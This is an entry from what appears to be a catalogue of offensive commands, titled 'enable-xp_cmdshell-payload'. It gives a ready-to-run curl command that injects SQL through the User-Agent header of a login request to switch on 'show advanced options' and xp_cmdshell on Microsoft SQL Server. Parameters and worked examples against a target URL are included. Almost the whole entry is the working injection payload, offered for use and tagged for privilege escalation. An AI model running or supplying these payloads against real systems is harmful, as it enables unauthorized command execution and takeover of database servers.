---
data: >-
  curl -X POST $TARGET -H "User-Agent: '; $SQL_PAYLOAD;--" -d
  "username=test&password=test"
tags:
  - sqli
  - privilege-escalation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.410Z'
id: d2914d84-7b1e-406a-a9a3-ac3fc3db2085
verified: false
validated: true
submitted: true
---
# enable-xp_cmdshell-payload

## Command

```bash
curl -X POST $TARGET -H "User-Agent: '; $SQL_PAYLOAD;--" -d "username=test&password=test"
```

## Description

Injects SQL via User-Agent to execute sp_configure for enabling xp_cmdshell on MSSQL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $TARGET | Target login URL | Yes |
| $SQL_PAYLOAD | SQL like EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--" -d "username=test&password=test"
```

### Advanced Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: '; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--" -d "username=test&password=test"
```

## Expected Output

Standard HTTP response; no errors indicate success.

## Related

- [[Related Procedure]]
